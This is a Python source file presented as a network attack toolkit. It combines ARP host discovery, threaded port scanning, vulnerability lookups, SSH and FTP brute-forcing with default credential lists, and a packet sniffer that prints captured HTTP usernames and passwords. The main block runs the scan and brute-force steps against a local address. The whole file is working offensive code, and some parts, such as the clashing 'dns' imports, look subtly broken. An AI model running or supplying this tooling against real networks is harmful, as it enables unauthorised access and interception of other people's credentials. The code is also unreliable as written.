import scapy.all as scapy
import socket
import nmap
import vulners
import paramiko
import ftplib
from scapy.layers import http
from scapy.layers import dns
from scapy.layers import inet
import concurrent.futures  # Adjusted import for consistency
import dns.resolver

def scan(ip, ports):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)

    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:  # Adjusted import for ThreadPoolExecutor
        future_to_port = {executor.submit(scan_port, client["ip"], port): port for port in ports for client in clients_list}
        for future in concurrent.futures.as_completed(future_to_port):  # Adjusted import for as_completed
            port = future_to_port[future]
            try:
                result = future.result()
                if result:
                    open_ports.append({"ip": result["ip"], "mac": result["mac"], "port": port, "service": result["service"],
                                       "vulnerabilities": result.get("vulnerabilities", []),
                                       "ssh_credentials": result.get("ssh_credentials", []),
                                       "ftp_credentials": result.get("ftp_credentials", [])})
            except Exception as e:
                print(f"Error scanning port {port}: {str(e)}")

    return clients_list, open_ports

def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((ip, port))
            service = get_service_name(port)
            vulnerabilities = scan_for_vulnerabilities(ip, port)
            ssh_credentials = []
            ftp_credentials = []

            if port == 22:  # SSH
                ssh_credentials = brute_force_ssh(ip)

            elif port == 21:  # FTP
                ftp_credentials = brute_force_ftp(ip)

            return {"ip": ip, "mac": get_mac_address(ip), "port": port, "service": service, "vulnerabilities": vulnerabilities,
                    "ssh_credentials": ssh_credentials, "ftp_credentials": ftp_credentials}
    except:
        return None

def scan_for_vulnerabilities(ip, port):
    vulners_api = vulners.Vulners()
    vulnerabilities = []
    try:
        results = vulners_api.portvulns(ip, port)
        for result in results:
            vulnerabilities.append(result.get("title"))
    except Exception as e:
        print(f"Error scanning for vulnerabilities on {ip}:{port}: {str(e)}")
    return vulnerabilities

def brute_force_ssh(ip):
    credentials = []
    # Implement SSH brute-force logic using paramiko
    # Example: Try common usernames and passwords
    common_usernames = ["admin", "root", "user"]
    common_passwords = ["password", "admin123", "123456"]
    for username in common_usernames:
        for password in common_passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=username, password=password, timeout=1)
                credentials.append({"username": username, "password": password})
                ssh.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"Error during SSH brute force on {ip}: {str(e)}")
    return credentials

def brute_force_ftp(ip):
    credentials = []
    # Implement FTP brute-force logic using ftplib
    # Example: Try common usernames and passwords
    common_usernames = ["admin", "root", "user"]
    common_passwords = ["password", "admin123", "123456"]
    for username in common_usernames:
        for password in common_passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port=21, timeout=1)
                ftp.login(username, password)
                credentials.append({"username": username, "password": password})
                ftp.quit()
            except Exception as e:
                print(f"Error during FTP brute force on {ip}: {str(e)}")
    return credentials

def packet_sniffer(interface="eth0"):
    try:
        scapy.sniff(iface=interface, store=False, prn=process_packet)
    except Exception as e:
        print(f"Error during packet sniffing: {str(e)}")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP Request: {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"Possible username/password found: {login_info}")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def dns_enum(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        ip_addresses = [ip.address for ip in result]
        return ip_addresses
    except dns.exception.DNSException as e:
        print(f"Error during DNS enumeration for {domain}: {str(e)}")
        return []

def get_service_name(port):
    try:
        service = socket.getservbyport(port)
        return service
    except:
        return "Unknown"

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for element in answered_list:
        return element[1].hwsrc

# Example: Start packet_sniffer
# packet_sniffer("eth0")  # Uncomment and customize interface as needed
# Example: Start packet_sniffer
# Uncomment and customize interface as needed
# packet_sniffer("eth0")

if __name__ == "__main__":
    # You can add code here to execute specific functions or start the toolkit based on user input.
    # For example:

    # Example 1: Execute a scan
    target_ip = "192.168.1.1"
    target_ports = [80, 22, 21]
    clients, open_ports = scan(target_ip, target_ports)
    print("Discovered Clients:", clients)
    print("Open Ports:", open_ports)

    # Example 2: DNS enumeration
    target_domain = "example.com"
    dns_results = dns_enum(target_domain)
    print(f"DNS Enumeration for {target_domain}: {dns_results}")

    # Example 3: Packet sniffing
    # Uncomment and customize interface as needed
    # packet_sniffer("eth0")

    # Add more examples or integrate with a user interface for better interaction.
